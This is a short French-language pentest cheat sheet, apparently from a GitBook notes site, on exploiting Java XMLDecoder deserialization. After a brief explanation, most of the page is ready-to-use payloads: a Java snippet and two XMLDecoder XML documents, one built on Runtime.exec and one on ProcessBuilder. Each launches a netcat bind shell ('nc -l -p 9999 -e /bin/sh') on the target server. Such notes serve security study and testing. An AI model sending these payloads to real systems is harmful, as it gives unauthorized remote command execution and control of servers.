# XMLDecoder

La faille exploite  le fait que XMLDecoder unserialize de données arbitraires.

XMLDecoder est une classe Java qui cré des object basé sur un message XML. SI un utilisateur peut lancer une exécution de la methode \*readObject\* avec du code arbitraire, il pourra executer de code sur le serveur.

### Exploitation

le but et d'avoir un remote shell sur le serveur. Notre Code en java devrait ressembler à ca :&#x20;

```java
Runtime run = Runtime.getRuntime();
String[] commands = new String[] { "/usr/bin/nc", "-l","-p", "9999", "-e", "/bin/sh" };
run.exec(commands);
```

il faut transformer ce code au format XML pour mener a une exécution coté serveur après être passé par la méthode readObject.&#x20;

Avec un object Runtime  :&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<java version="1.7.0_21" class="java.beans.XMLDecoder">
	 <object class="java.lang.Runtime" method="getRuntime">
	      <void method="exec">
	      <array class="java.lang.String" length="6">
	          <void index="0">
	              <string>/usr/bin/nc</string>
	          </void>
	          <void index="1">
	              <string>-l</string>
	          </void>
	          <void index="2">
	              <string>-p</string>
	          </void>
	          <void index="3">
	              <string>9999</string>
	          </void>
	          <void index="4">
	              <string>-e</string>
	          </void>
	          <void index="5">
	              <string>/bin/sh</string>
	          </void>
	      </array>
	      </void>
	 </object>
	</java>
```
{% endcode %}

Avec un Process Builder  :&#x20;

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<java version="1.7.0_21" class="java.beans.XMLDecoder">
	  <void class="java.lang.ProcessBuilder">
	    <array class="java.lang.String" length="6">
	      <void index="0">
	        <string>/usr/bin/nc</string>
	      </void>
	      <void index="1">
	         <string>-l</string>
	      </void>
	      <void index="2">
	         <string>-p</string>
	      </void>
	      <void index="3">
	         <string>9999</string>
	      </void>
	      <void index="4">
	         <string>-e</string>
	      </void>
	      <void index="5">
	         <string>/bin/sh</string>
	      </void>
	    </array>
	    <void method="start" id="process">
	    </void>
	  </void>
	</java>
```
